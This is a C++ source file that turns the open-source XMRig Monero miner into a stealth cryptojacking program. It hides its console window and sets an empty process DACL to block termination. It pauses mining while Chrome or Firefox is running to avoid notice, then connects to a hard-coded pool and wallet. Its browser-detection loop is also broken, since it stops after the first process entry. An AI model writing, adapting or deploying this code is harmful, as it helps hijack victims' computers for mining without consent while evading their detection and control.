/* XMRig
* Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
* Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
* Copyright 2014      Lucas Jones <https://github.com/lucasjones>
* Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
* Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
* Copyright 2016-2017 XMRig       <support@xmrig.com>
*
*
*   This program is free software: you can redistribute it and/or modify
*   it under the terms of the GNU General Public License as published by
*   the Free Software Foundation, either version 3 of the License, or
*   (at your option) any later version.
*
*   This program is distributed in the hope that it will be useful,
*   but WITHOUT ANY WARRANTY; without even the implied warranty of
*   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
*   GNU General Public License for more details.
*
*   You should have received a copy of the GNU General Public License
*   along with this program. If not, see <http://www.gnu.org/licenses/>.
*/

#include "App.h"
#include <Windows.h>
#include <sddl.h>
#include <tlhelp32.h>
#include <thread>

#pragma comment(linker, "/subsystem:windows /ENTRY:mainCRTStartup") // hide console

bool DACL()
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	SECURITY_ATTRIBUTES sa;
	TCHAR * szSD = TEXT("D:P");

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = FALSE;
	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(szSD, SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL))
		return FALSE;
	if (!SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, sa.lpSecurityDescriptor))
		return FALSE;
	return TRUE;
}

bool noIDLE(void)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hSnapshot, &pe);
	while (Process32Next(hSnapshot, &pe)) {
		for (int i = 0; i != 25; i++) {
			if (lstrcmp(pe.szExeFile, L"firefox.exe") == 0 || lstrcmp(pe.szExeFile, L"chrome.exe") == 0)
				return true;
			else
				return false;
		}
	}
}

void checkIDLE() {
	while (true) {
		bool Founded = false;

		if (noIDLE())
			Founded = true;

		switch (Founded) {
		case 1:
			Workers::setEnabled(false);
			Sleep(30000);
			break;

		default:
			if (!Workers::isEnabled())
				Workers::setEnabled(true);
			break;
		}
		
		Sleep(1000);
	}
}

int main()
{
	DACL(); //prevent process kill
	
	std::thread* user_idle = new std::thread(checkIDLE); //check computer idle
	user_idle->detach();
	
	static char * params[] = { "miner", "-o", "pool", "-u", "wallet", "-p", "x"};
	App Application(7, params);

	return Application.exec();}
